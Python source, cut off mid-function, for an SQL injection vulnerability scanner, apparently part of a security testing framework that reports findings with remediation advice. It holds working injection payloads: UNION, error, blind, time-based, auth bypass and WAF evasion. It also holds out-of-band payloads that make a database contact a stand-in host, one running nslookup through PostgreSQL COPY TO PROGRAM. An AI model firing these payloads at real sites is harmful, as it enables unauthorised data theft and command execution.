"""Enhanced SQL Injection Scanner Module - Industry-Grade Detection."""

import asyncio
import subprocess
import json
import tempfile
import os
import statistics
import time
import hashlib
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from collections import defaultdict
import re
import httpx
from ..base_module import (
    BaseScannerModule,
    ScanConfig,
    ScanResult,
    Vulnerability,
    SeverityLevel,
    ScanType
)


class PayloadGenerator:
    """Dynamic SQL injection payload generator."""
    
    def __init__(self):
        self.database_signatures = {
            'mysql': ['mysql', 'maria', 'percona'],
            'postgresql': ['postgres', 'psql', 'pg_'],
            'mssql': ['microsoft sql', 'mssql', 'sql server'],
            'oracle': ['oracle', 'ora-'],
            'sqlite': ['sqlite'],
        }
        
    def generate_payloads(self, context: str = 'generic', db_type: Optional[str] = None) -> List[Dict[str, Any]]:
        """Generate context-aware payloads."""
        payloads = []
        
        # Basic error-based payloads
        payloads.extend(self._get_error_based_payloads(db_type))
        
        # Context-specific payloads
        if context == 'where':
            payloads.extend(self._get_where_clause_payloads(db_type))
        elif context == 'order_by':
            payloads.extend(self._get_order_by_payloads(db_type))
        elif context == 'union':
            payloads.extend(self._get_union_payloads(db_type))
        
        # Time-based blind payloads
        payloads.extend(self._get_time_based_payloads(db_type))
        
        # Boolean-based blind payloads
        payloads.extend(self._get_boolean_payloads())
        
        # WAF evasion variants
        payloads.extend(self._get_evasion_payloads(db_type))
        
        return payloads
    
    def _get_error_based_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get error-based payloads."""
        base_payloads = [
            {"payload": "'", "type": "error-based", "description": "Single quote"},
            {"payload": "\"", "type": "error-based", "description": "Double quote"},
            {"payload": "')", "type": "error-based", "description": "Quote with parenthesis"},
            {"payload": "'))", "type": "error-based", "description": "Quote with double parenthesis"},
        ]
        
        if not db_type or db_type == 'mysql':
            base_payloads.extend([
                {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))--", "type": "error-based", "description": "MySQL EXTRACTVALUE"},
                {"payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", "type": "error-based", "description": "MySQL double query"},
            ])
        
        if not db_type or db_type == 'postgresql':
            base_payloads.extend([
                {"payload": "' AND 1=CAST((SELECT version()) AS int)--", "type": "error-based", "description": "PostgreSQL type casting"},
            ])
        
        if not db_type or db_type == 'mssql':
            base_payloads.extend([
                {"payload": "' AND 1=CONVERT(int,@@version)--", "type": "error-based", "description": "MSSQL type conversion"},
            ])
        
        return base_payloads
    
    def _get_where_clause_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get WHERE clause specific payloads."""
        return [
            {"payload": "' OR '1'='1", "type": "boolean-where", "description": "Always true condition"},
            {"payload": "' OR '1'='1' --", "type": "boolean-where", "description": "Always true with comment"},
            {"payload": "' OR 1=1 --", "type": "boolean-where", "description": "Numeric always true"},
            {"payload": "admin' --", "type": "auth-bypass", "description": "Admin bypass"},
        ]
    
    def _get_order_by_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get ORDER BY clause specific payloads."""
        payloads = [
            {"payload": "1 ASC", "type": "order-by", "description": "Valid ORDER BY"},
            {"payload": "1 DESC", "type": "order-by", "description": "Valid ORDER BY DESC"},
        ]
        
        if not db_type or db_type == 'mysql':
            payloads.append({"payload": "(SELECT IF(1=1,1,(SELECT 1 UNION SELECT 2)))", "type": "order-by-blind", "description": "MySQL ORDER BY blind"})
        
        return payloads
    
    def _get_union_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get UNION-based payloads."""
        return [
            {"payload": "' UNION SELECT NULL--", "type": "union", "description": "UNION 1 column"},
            {"payload": "' UNION SELECT NULL,NULL--", "type": "union", "description": "UNION 2 columns"},
            {"payload": "' UNION SELECT NULL,NULL,NULL--", "type": "union", "description": "UNION 3 columns"},
            {"payload": "' UNION SELECT 1,2,3--", "type": "union", "description": "UNION numeric values"},
            {"payload": "' UNION ALL SELECT NULL--", "type": "union", "description": "UNION ALL 1 column"},
        ]
    
    def _get_time_based_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get time-based blind payloads."""
        payloads = []
        
        if not db_type or db_type == 'mysql':
            payloads.extend([
                {"payload": "' AND SLEEP(5)--", "type": "time-based", "delay": 5, "description": "MySQL SLEEP"},
                {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "type": "time-based", "delay": 5, "description": "MySQL nested SLEEP"},
                {"payload": "' AND IF(1=1,SLEEP(5),0)--", "type": "time-based", "delay": 5, "description": "MySQL conditional SLEEP"},
            ])
        
        if not db_type or db_type == 'postgresql':
            payloads.extend([
                {"payload": "'; SELECT pg_sleep(5)--", "type": "time-based", "delay": 5, "description": "PostgreSQL pg_sleep"},
                {"payload": "' AND 1=(SELECT 1 FROM pg_sleep(5))--", "type": "time-based", "delay": 5, "description": "PostgreSQL nested sleep"},
            ])
        
        if not db_type or db_type == 'mssql':
            payloads.extend([
                {"payload": "'; WAITFOR DELAY '00:00:05'--", "type": "time-based", "delay": 5, "description": "MSSQL WAITFOR"},
                {"payload": "' IF 1=1 WAITFOR DELAY '00:00:05'--", "type": "time-based", "delay": 5, "description": "MSSQL conditional WAITFOR"},
            ])
        
        if not db_type or db_type == 'oracle':
            payloads.extend([
                {"payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--", "type": "time-based", "delay": 5, "description": "Oracle DBMS_PIPE"},
            ])
        
        return payloads
    
    def _get_boolean_payloads(self) -> List[Dict[str, Any]]:
        """Get boolean-based blind payloads."""
        return [
            {"payload": "' AND '1'='1", "type": "boolean-true", "description": "True condition"},
            {"payload": "' AND '1'='2", "type": "boolean-false", "description": "False condition"},
            {"payload": "' AND 1=1--", "type": "boolean-true", "description": "Numeric true"},
            {"payload": "' AND 1=2--", "type": "boolean-false", "description": "Numeric false"},
            {"payload": "' AND 'a'='a", "type": "boolean-true", "description": "String true"},
            {"payload": "' AND 'a'='b", "type": "boolean-false", "description": "String false"},
        ]
    
    def _get_evasion_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get WAF evasion payloads."""
        return [
            {"payload": "'/**/OR/**/1=1--", "type": "evasion-comment", "description": "Comment-based evasion"},
            {"payload": "'+OR+1=1--", "type": "evasion-plus", "description": "Plus sign evasion"},
            {"payload": "'||'1'='1", "type": "evasion-concat", "description": "Concatenation evasion"},
            {"payload": "%27%20OR%201=1--", "type": "evasion-encoded", "description": "URL encoded"},
            {"payload": "' /*!50000OR*/ 1=1--", "type": "evasion-version", "description": "MySQL version comment"},
            {"payload": "' %0aOR%0a1=1--", "type": "evasion-newline", "description": "Newline evasion"},
            {"payload": "' %09OR%091=1--", "type": "evasion-tab", "description": "Tab evasion"},
        ]
    
    def detect_database_type(self, error_text: str) -> Optional[str]:
        """Detect database type from error messages."""
        error_lower = error_text.lower()
        
        for db_type, signatures in self.database_signatures.items():
            for signature in signatures:
                if signature in error_lower:
                    return db_type
        
        return None


class OOBDetector:
    """Out-of-Band SQL injection detector."""
    
    def __init__(self, domain: str = None):
        self.domain = domain or "oob-sqli-test.example.com"
        self.interactions = {}
    
    def generate_oob_payload(self, param_name: str, db_type: str = 'mysql') -> Tuple[str, str]:
        """Generate OOB payload and unique identifier."""
        unique_id = hashlib.md5(f"{param_name}{time.time()}".encode()).hexdigest()[:8]
        subdomain = f"{unique_id}.{self.domain}"
        
        payloads = {
            'mysql': f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',{subdomain},'\\\\test'))--",
            'mssql': f"'; EXEC master..xp_dirtree '\\\\{subdomain}\\test'--",
            'oracle': f"' UNION SELECT UTL_INADDR.get_host_address('{subdomain}') FROM dual--",
            'postgresql': f"'; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}'--",
        }
        
        payload = payloads.get(db_type, payloads['mysql'])
        return payload, unique_id
    
    def check_interaction(self, unique_id: str) -> bool:
        """Check if OOB interaction occurred (stub - needs DNS/HTTP server)."""
        # In production, this would check DNS logs or HTTP callbacks
        # For now, return False as we don't have the infrastructure
        return False


class SQLInjectionScanner(BaseScannerModule):
    """Enhanced SQL Injection vulnerability scanner."""
    
    def __init__(self):
        super().__init__()
        self.name = "SQLInjectionScanner"
        self.description = "Industry-grade SQL injection vulnerability scanner"
        self.scan_type = ScanType.ACTIVE
        self.payload_generator = PayloadGenerator()
        self.oob_detector = OOBDetector()
        
        # SQL error patterns with severity indicators
        self.sql_error_patterns = [
            # MySQL - High confidence
            (r"SQL syntax.*MySQL", 0.95, "MySQL"),
            (r"Warning.*mysql_", 0.95, "MySQL"),
            (r"MySqlException", 0.95, "MySQL"),
            (r"com\.mysql\.jdbc", 0.95, "MySQL"),
            
            # PostgreSQL - High confidence
            (r"PostgreSQL.*ERROR", 0.95, "PostgreSQL"),
            (r"Warning.*\Wpg_", 0.95, "PostgreSQL"),
            (r"Npgsql\.", 0.95, "PostgreSQL"),
            (r"org\.postgresql\.util\.PSQLException", 0.95, "PostgreSQL"),
            
            # MS SQL Server - High confidence
            (r"Driver.*SQL[\-\_\ ]*Server", 0.95, "MSSQL"),
            (r"OLE DB.*SQL Server", 0.95, "MSSQL"),
            (r"SQLServer.*JDBC", 0.95, "MSSQL"),
            (r"System\.Data\.SqlClient\.SqlException", 0.95, "MSSQL"),
            
            # Oracle - High confidence
            (r"ORA-\d{5}", 0.95, "Oracle"),
            (r"Oracle.*Driver", 0.95, "Oracle"),
            (r"oracle\.jdbc", 0.95, "Oracle"),
            
            # SQLite - High confidence
            (r"SQLite/JDBCDriver", 0.95, "SQLite"),
            (r"SQLite\.Exception", 0.95, "SQLite"),
            (r"System\.Data\.SQLite\.SQLiteException", 0.95, "SQLite"),
            
            # Generic SQL errors - Medium confidence
            (r"SQL error", 0.7, "Generic"),
            (r"syntax error", 0.6, "Generic"),
            (r"database error", 0.7, "Generic"),
            (r"Incorrect syntax near", 0.8, "Generic"),
            (r"Unclosed quotation mark", 0.8, "Generic"),
            (r"quoted string not properly terminated", 0.8, "Generic"),
        ]
    
    def validate_target(self, target: str) -> bool:
        """Validate if target is suitable for SQL injection testing."""
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        try:
            parsed = urlparse(target)
            return bool(parsed.scheme and parsed.netloc)
        except:
            return False
    
    async def scan(self, config: ScanConfig) -> ScanResult:
        """Perform comprehensive SQL injection scan."""
        started_at = datetime.utcnow()
        vulnerabilities = []
        errors = []
        warnings = []
        info = {
            'tested_parameters': [],
            'vulnerable_parameters': [],
            'injection_types': [],
            'database_type': None,
            'detection_methods': [],
            'second_order_candidates': [],
        }
        statistics = {
            'urls_tested': 0,
            'parameters_tested': 0,
            'payloads_sent': 0,
            'vulnerabilities_found': 0,
            'injection_points': 0,
            'false_positives_filtered': 0,
            'payloads_by_type': {
                'error-based': 0,
                'time-based': 0,
                'boolean-based': 0,
                'union-based': 0,
                'other': 0
            }
        }
        
        try:
            target_url = config.target
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            if config.scan_type == ScanType.PASSIVE:
                passive_vulns = await self._passive_sql_check(target_url)
                vulnerabilities.extend(passive_vulns)
            else:
                # Phase 1: Initial reconnaissance
                recon_data = await self._reconnaissance_phase(target_url, config)
                info['database_type'] = recon_data.get('database_type')
                statistics['urls_tested'] = recon_data.get('urls_found', 1)
                
                # Phase 2: Enhanced manual testing with dynamic payloads
                manual_results = await self._enhanced_manual_testing(
                    target_url, config, recon_data.get('database_type')
                )
                vulnerabilities.extend(manual_results['vulnerabilities'])
                info['tested_parameters'].extend(manual_results['tested_params'])
                statistics['parameters_tested'] = len(manual_results['tested_params'])
                statistics['payloads_sent'] += manual_results.get('payloads_sent', 0)
                
                # Update payload type statistics
                for ptype, count in manual_results.get('payloads_by_type', {}).items():
                    if ptype in statistics['payloads_by_type']:
                        statistics['payloads_by_type'][ptype] += count
                statistics['false_positives_filtered'] = manual_results.get('false_positives', 0)
                
                # Phase 3: Advanced time-based detection with statistical analysis
                if config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]:
                    time_based_results = await self._advanced_time_based_detection(
                        target_url, config, recon_data.get('database_type')
                    )
                    vulnerabilities.extend(time_based_results['vulnerabilities'])
                    info['detection_methods'].append('Statistical Time-Based Analysis')
                
                # Phase 4: Second-order SQL injection detection
                if config.scan_type == ScanType.AGGRESSIVE:
                    second_order_results = await self._second_order_detection(target_url, config)
                    vulnerabilities.extend(second_order_results['vulnerabilities'])
                    info['second_order_candidates'] = second_order_results.get('candidates', [])
                    if second_order_results['vulnerabilities']:
                        info['detection_methods'].append('Second-Order SQLi')
                
                # Phase 5: Form testing with context awareness
                form_results = await self._context_aware_form_testing(
                    target_url, config, recon_data.get('database_type')
                )
                vulnerabilities.extend(form_results)
                
                # Phase 6: SQLMap integration (if available and aggressive)
                if config.scan_type == ScanType.AGGRESSIVE and self._is_sqlmap_available():
                    sqlmap_results = await self._intelligent_sqlmap_integration(
                        target_url, config, recon_data
                    )
                    if sqlmap_results:
                        vulnerabilities.extend(sqlmap_results['vulnerabilities'])
                        info['vulnerable_parameters'].extend(sqlmap_results.get('vulnerable_params', []))
                        if not info['database_type']:
                            info['database_type'] = sqlmap_results.get('database_type')
            
            # Deduplicate vulnerabilities
            vulnerabilities = self._deduplicate_vulnerabilities(vulnerabilities)
            statistics['vulnerabilities_found'] = len(vulnerabilities)
            statistics['injection_points'] = len(set(v.evidence.get('parameter', '') for v in vulnerabilities))
            
            # Determine injection types
            injection_types = set()
            for vuln in vulnerabilities:
                vuln_type = vuln.evidence.get('injection_type', vuln.name.split()[0])
                injection_types.add(vuln_type)
            info['injection_types'] = list(injection_types)
            
        except Exception as e:
            errors.append(f"SQL injection scan failed: {str(e)}")
        
        completed_at = datetime.utcnow()
        
        return ScanResult(
            module_name=self.name,
            success=len(errors) == 0,
            started_at=started_at,
            completed_at=completed_at,
            vulnerabilities=vulnerabilities,
            errors=errors,
            warnings=warnings,
            info=info,
            statistics=statistics
        )
    
    async def _reconnaissance_phase(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """Perform initial reconnaissance to identify database type and structure."""
        recon_data = {
            'database_type': None,
            'urls_found': 1,
            'parameters': [],
            'forms': []
        }
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=10) as client:
                response = await client.get(url)
                
                # Detect database type from error messages
                for pattern, confidence, db_type in self.sql_error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        recon_data['database_type'] = db_type
                        break
                
                # Look for database fingerprints in headers and content
                if not recon_data['database_type']:
                    recon_data['database_type'] = self._fingerprint_database(response)
                
                # Extract parameters
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                recon_data['parameters'] = list(params.keys())
                
        except Exception as e:
            pass
        
        return recon_data
    
    def _fingerprint_database(self, response: httpx.Response) -> Optional[str]:
        """Fingerprint database from response characteristics."""
        headers = str(response.headers).lower()
        content = response.text.lower()
        
        # Check headers
        if 'x-powered-by' in headers:
            powered_by = response.headers.get('X-Powered-By', '').lower()
            if 'php' in powered_by:
                return 'mysql'  # Common combo
            elif 'asp.net' in powered_by:
                return 'mssql'  # Common combo
        
        # Check for database-specific keywords in content
        if 'phpmyadmin' in content or 'mysql' in content:
            return 'mysql'
        elif 'pgadmin' in content or 'postgresql' in content:
            return 'postgresql'
        elif 'oracle' in content:
            return 'oracle'
        
        return None
    
    async def _enhanced_manual_testing(self, url: str, config: ScanConfig, db_type: Optional[str]) -> Dict[str, Any]:
        """Enhanced manual testing with dynamic payloads."""
        vulnerabilities = []
        tested_params = []
        payloads_sent = 0
        false_positives = 0
        found_error_based = False  # Track if we found error-based SQLi
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            common_params = ['id', 'user', 'search', 'q', 'page', 'cat']
            params = {param: ['1'] for param in common_params[:2]}
        
        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            # Get baseline response
            try:
                baseline_response = await client.get(url)
                baseline_data = self._extract_response_features(baseline_response)
            except:
                return {'vulnerabilities': [], 'tested_params': [], 'payloads_sent': 0}
            
            for param_name, param_values in params.items():
                tested_params.append(param_name)
                original_value = param_values[0] if param_values else '1'
                
                # Detect injection context
                context = self._detect_injection_context(url, param_name)
                
                # Generate context-aware payloads
                payloads = self.payload_generator.generate_payloads(context, db_type)
                
                # Test all injection types, not just until first found
                for payload_info in payloads[:20]:  # Test more payloads for thoroughness
                    payload = payload_info['payload']
                    payload_type = payload_info['type']
                    
                    test_params = params.copy()
                    test_params[param_name] = [original_value + payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    try:
                        response = await client.get(test_url, timeout=15)
                        payloads_sent += 1
                        
                        # Track payload types
                        if 'error' in payload_type:
                            payload_type_key = 'error-based'
                        elif 'time' in payload_type:
                            payload_type_key = 'time-based'
                        elif 'boolean' in payload_type:
                            payload_type_key = 'boolean-based'
                        elif 'union' in payload_type:
                            payload_type_key = 'union-based'
                        else:
                            payload_type_key = 'other'
                        
                        # Enhanced error-based detection
                        if 'error' in payload_type:
                            error_result = self._enhanced_error_detection(
                                response, baseline_response, payload_info
                            )
                            if error_result['vulnerable']:
                                # Verify to reduce false positives
                                if await self._verify_sql_injection(client, test_url, param_name, params):
                                    vuln = self._create_vulnerability(
                                        param_name, url, payload_info, error_result, 'Error-Based'
                                    )
                                    vulnerabilities.append(vuln)
                                    found_error_based = True
                                    continue  # Continue to test other types
                                else:
                                    false_positives += 1
                        
                        # Boolean-based detection
                        if payload_type in ['boolean-true', 'boolean-false'] and not found_error_based:
                            boolean_result = await self._enhanced_boolean_detection(
                                client, url, param_name, params, original_value, baseline_data
                            )
                            if boolean_result['vulnerable']:
                                vuln = self._create_vulnerability(
                                    param_name, url, payload_info, boolean_result, 'Boolean-Based Blind'
                                )
                                vulnerabilities.append(vuln)
                                continue  # Continue testing other types
                    
                    except asyncio.TimeoutError:
                        if 'time-based' in payload_type:
                            # Will be handled by advanced time-based detection
                            pass
                    except:
                        pass
        
        return {
            'vulnerabilities': vulnerabilities,
            'tested_params': tested_params,
            'payloads_sent': payloads_sent,
            'false_positives': false_positives,
            'payloads_by_type': {
                'error-based': sum(1 for p in payloads[:payloads_sent] if 'error' in p.get('type', '')),
                'time-based': sum(1 for p in payloads[:payloads_sent] if 'time' in p.get('type', '')),
                'boolean-based': sum(1 for p in payloads[:payloads_sent] if 'boolean' in p.get('type', '')),
                'union-based': sum(1 for p in payloads[:payloads_sent] if 'union' in p.get('type', '')),
            }
        }
    
    def _detect_injection_context(self, url: str, param_name: str) -> str:
        """Detect the SQL context of the injection point."""
        # Heuristics to detect context
        param_lower = param_name.lower()
        
        if 'sort' in param_lower or 'order' in param_lower:
            return 'order_by'
        elif 'search' in param_lower or 'query' in param_lower:
            return 'where'
        else:
            return 'generic'
    
    def _extract_response_features(self, response: httpx.Response) -> Dict[str, Any]:
        """Extract features from response for comparison."""
        return {
            'status_code': response.status_code,
            'length': len(response.text),
            'headers': dict(response.headers),
            'num_tags': len(re.findall(r'<[^>]+>', response.text)),
            'num_words': len(response.text.split()),
            'num_lines': len(response.text.splitlines()),
            'has_table': '<table' in response.text.lower(),
            'has_form': '<form' in response.text.lower(),
            'title': self._extract_title(response.text),
            'hash': hashlib.md5(response.text.encode()).hexdigest(),
        }
    
    def _extract_title(self, html: str) -> str:
        """Extract title from HTML."""
        match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        return match.group(1).strip() if match else ""
    
    def _enhanced_error_detection(self, response: httpx.Response, baseline: httpx.Response, 
                                   payload_info: Dict) -> Dict[str, Any]:
        """Enhanced error detection with confidence scoring."""
        result = {
            'vulnerable': False,
            'confidence': 0.0,
            'database_type': None,
            'error_message': None,
            'evidence': {}
        }
        
        # Check if baseline has errors
        baseline_has_errors = any(
            re.search(pattern, baseline.text, re.IGNORECASE)
            for pattern, _, _ in self.sql_error_patterns[:5]
        )
        
        for pattern, base_confidence, db_type in self.sql_error_patterns:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                # Adjust confidence based on baseline
                if baseline_has_errors:
                    confidence = base_confidence * 0.4  # Reduce confidence
                else:
                    confidence = base_confidence
                
                # Check if error is in typical error format
                if re.search(r'(error|exception|warning).*?(sql|database|query)', 
                           response.text, re.IGNORECASE):
                    confidence = min(1.0, confidence + 0.1)
                
                # Extract error message
                error_lines = []
                for line in response.text.splitlines():
                    if re.search(pattern, line, re.IGNORECASE):
                        error_lines.append(line.strip())
                
                result = {
                    'vulnerable': confidence > 0.7,
                    'confidence': confidence,
                    'database_type': db_type if db_type != 'Generic' else None,
                    'error_message': ' '.join(error_lines[:2]) if error_lines else match.group(0),
                    'evidence': {
                        'pattern_matched': pattern,
                        'error_snippet': match.group(0)[:200]
                    }
                }
                break
        
        return result
    
    async def _enhanced_boolean_detection(self, client: httpx.AsyncClient, url: str,
                                          param_name: str, params: Dict, original_value: str,
                                          baseline_data: Dict) -> Dict[str, Any]:
        """Enhanced boolean-based blind SQL injection detection."""
        result = {
            'vulnerable': False,
            'confidence': 0.0,
            'evidence': {}
        }
        
        parsed = urlparse(url)
        
        # Test true condition
        true_payload = original_value + "' AND '1'='1"
        test_params = params.copy()
        test_params[param_name] = [true_payload]
        true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
        
        try:
            true_response = await client.get(true_url, timeout=15)
            true_data = self._extract_response_features(true_response)
            
            # Test false condition
            false_payload = original_value + "' AND '1'='2"
            test_params[param_name] = [false_payload]
            false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            false_response = await client.get(false_url, timeout=15)
            false_data = self._extract_response_features(false_response)
            
            # Calculate differences
            length_diff = abs(true_data['length'] - false_data['length'])
            status_diff = true_data['status_code'] != false_data['status_code']
            hash_diff = true_data['hash'] != false_data['hash']
            title_diff = true_data['title'] != false_data['title']
            
            # Compare with baseline
            baseline_diff = abs(baseline_data['length'] - true_data['length'])
            
            # Calculate confidence
            confidence = 0.0
            if length_diff > 100 and length_diff > baseline_diff * 2:
                confidence += 0.4
            if status_diff:
                confidence += 0.2
            if hash_diff and length_diff > 50:
                confidence += 0.2
            if title_diff:
                confidence += 0.2
            
            result = {
                'vulnerable': confidence > 0.6,
                'confidence': min(confidence, 0.9),
                'evidence': {
                    'true_length': true_data['length'],
                    'false_length': false_data['length'],
                    'length_difference': length_diff,
                    'status_difference': status_diff,
                    'hash_difference': hash_diff,
                }
            }
        except:
            pass
        
        return result
    
    async def _verify_sql_injection(self, client: httpx.AsyncClient, test_url: str, 
                                    param_name: str, params: Dict) -> bool:
        """Verify SQL injection to reduce false positives."""
        try:
            # Send the same payload again
            response1 = await client.get(test_url, timeout=10)
            response2 = await client.get(test_url, timeout=10)
            
            # Check consistency
            if abs(len(response1.text) - len(response2.text)) > 1000:
                return False  # Inconsistent, likely false positive
            
            # Check if both have SQL errors
            has_error_1 = any(re.search(p, response1.text, re.IGNORECASE) 
                            for p, _, _ in self.sql_error_patterns[:10])
            has_error_2 = any(re.search(p, response2.text, re.IGNORECASE) 
                            for p, _, _ in self.sql_error_patterns[:10])
            
            return has_error_1 and has_error_2
        except:
            return False
    
    def _create_vulnerability(self, param_name: str, url: str, payload_info: Dict,
                            detection_result: Dict, injection_type: str) -> Vulnerability:
        """Create a vulnerability object with detailed evidence."""
        confidence = detection_result.get('confidence', 0.8)
        evidence = {
            'parameter': param_name,
            'payload': payload_info['payload'],
            'payload_type': payload_info['type'],
            'payload_description': payload_info['description'],
            'injection_type': injection_type,
            **detection_result.get('evidence', {})
        }
        
        if detection_result.get('database_type'):
            evidence['database_type'] = detection_result['database_type']
        
        if detection_result.get('error_message'):
            evidence['error_message'] = detection_result['error_message']
        
        # Determine severity
        if confidence > 0.9:
            severity = SeverityLevel.CRITICAL
        elif confidence > 0.75:
            severity = SeverityLevel.HIGH
        else:
            severity = SeverityLevel.MEDIUM
        
        return Vulnerability(
            module=self.name,
            name=f"SQL Injection ({injection_type}) in parameter '{param_name}'",
            description=self._generate_detailed_description(injection_type, param_name, evidence),
            severity=severity,
            confidence=confidence,
            affected_urls=[url],
            evidence=evidence,
            remediation=self._generate_remediation(injection_type),
            references=[
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html",
                "https://portswigger.net/web-security/sql-injection"
            ],
            cwe_ids=["CWE-89"]
        )
    
    def _generate_detailed_description(self, injection_type: str, param_name: str, 
                                      evidence: Dict) -> str:
        """Generate detailed vulnerability description."""
        desc = f"SQL Injection vulnerability detected in parameter '{param_name}' using {injection_type} technique. "
        
        if evidence.get('database_type'):
            desc += f"Database identified as {evidence['database_type']}. "
        
        if evidence.get('error_message'):
            desc += f"Error message disclosed: '{evidence['error_message'][:100]}...' "
        
        if injection_type == 'Boolean-Based Blind':
            desc += f"Application shows different responses for true/false conditions (length difference: {evidence.get('length_difference', 'N/A')} bytes). "
        
        if injection_type == 'Time-Based Blind':
            desc += f"Application response time indicates SQL injection (delay: {evidence.get('delay_observed', 'N/A')}s). "
        
        desc += "This vulnerability allows attackers to extract sensitive data, modify database contents, or gain unauthorized access."
        
        return desc
    
    def _generate_remediation(self, injection_type: str) -> str:
        """Generate specific remediation advice."""
        base = "1. Use parameterized queries (prepared statements) exclusively. "
        base += "2. Never concatenate user input directly into SQL queries. "
        base += "3. Implement input validation with whitelisting. "
        base += "4. Apply principle of least privilege to database accounts. "
        base += "5. Use Web Application Firewall (WAF) as defense-in-depth. "
        
        if 'Error' in injection_type:
            base += "6. Disable detailed error messages in production. "
            base += "7. Implement proper error handling and logging. "
        
        if 'Blind' in injection_type:
            base += "6. Ensure consistent error responses. "
            base += "7. Implement rate limiting and monitoring. "
        
        return base
    
    async def _advanced_time_based_detection(self, url: str, config: ScanConfig,
                                            db_type: Optional[str]) -> Dict[str, Any]:
        """Advanced time-based detection with statistical analysis."""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return {'vulnerabilities': []}
        
        async with httpx.AsyncClient(verify=False) as client:
            for param_name, param_values in params.items():
                original_value = param_values[0] if param_values else '1'
                
                # Measure baseline response times (5 requests)
                baseline_times = []
                for _ in range(5):
                    try:
                        start = time.time()
                        await client.get(url, timeout=20)
                        baseline_times.append(time.time() - start)
                    except:
                        pass
                
                if len(baseline_times) < 3:
                    continue
                
                # Calculate baseline statistics
                baseline_mean = statistics.mean(baseline_times)
                baseline_stdev = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0.5
                
                # Generate time-based payloads
                time_payloads = self.payload_generator.generate_payloads('generic', db_type)
                time_payloads = [p for p in time_payloads if p['type'] == 'time-based']
                
                for payload_info in time_payloads[:3]:  # Test top 3
                    test_params = params.copy()
                    test_params[param_name] = [original_value + payload_info['payload']]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    # Measure response times with payload (3 requests)
                    payload_times = []
                    for _ in range(3):
                        try:
                            start = time.time()
                            await client.get(test_url, timeout=20)
                            elapsed = time.time() - start
                            payload_times.append(elapsed)
                        except asyncio.TimeoutError:
                            payload_times.append(20)  # Timeout value
                        except:
                            pass
                    
                    if len(payload_times) < 2:
                        continue
                    
                    payload_mean = statistics.mean(payload_times)
                    expected_delay = payload_info.get('delay', 5)
                    
                    # Statistical analysis
                    time_increase = payload_mean - baseline_mean
                    z_score = (payload_mean - baseline_mean) / (baseline_stdev + 0.1)
                    
                    # Check if time increase is significant
                    if time_increase >= expected_delay * 0.8 and z_score > 2:
                        confidence = min(0.95, 0.6 + (time_increase / expected_delay) * 0.2)
                        
                        # Verify with second payload
                        verified = False
                        if len(time_payloads) > 1:
                            verify_payload = time_payloads[1]
                            test_params[param_name] = [original_value + verify_payload['payload']]
                            verify_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                            
                            try:
                                start = time.time()
                                await client.get(verify_url, timeout=20)
                                verify_time = time.time() - start
                                if verify_time >= expected_delay * 0.8:
                                    verified = True
                                    confidence = min(0.95, confidence + 0.1)
                            except:
                                pass
                        
                        vuln = Vulnerability(
                            module=self.name,
                            name=f"Time-Based Blind SQL Injection in '{param_name}'",
                            description=self._generate_detailed_description('Time-Based Blind', param_name, {
                                'baseline_mean': baseline_mean,
                                'payload_mean': payload_mean,
                                'time_increase': time_increase,
                                'z_score': z_score,
                            }),
                            severity=SeverityLevel.HIGH,
                            confidence=confidence,
                            affected_urls=[url],
                            evidence={
                                'parameter': param_name,
                                'payload': payload_info['payload'],
                                'injection_type': 'Time-Based Blind',
                                'baseline_mean': round(baseline_mean, 2),
                                'payload_mean': round(payload_mean, 2),
                                'time_increase': round(time_increase, 2),
                                'expected_delay': expected_delay,
                                'z_score': round(z_score, 2),
                                'verified': verified,
                                'statistical_significance': 'High' if z_score > 3 else 'Medium',
                            },
                            remediation=self._generate_remediation('Time-Based Blind'),
                            cwe_ids=["CWE-89"]
                        )
                        vulnerabilities.append(vuln)
                        break
        
        return {'vulnerabilities': vulnerabilities}
    
    async def _second_order_detection(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """Detect second-order SQL injection vulnerabilities."""
        vulnerabilities = []
        candidates = []
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=15) as client:
                response = await client.get(url)
                
                # Find forms that might store data
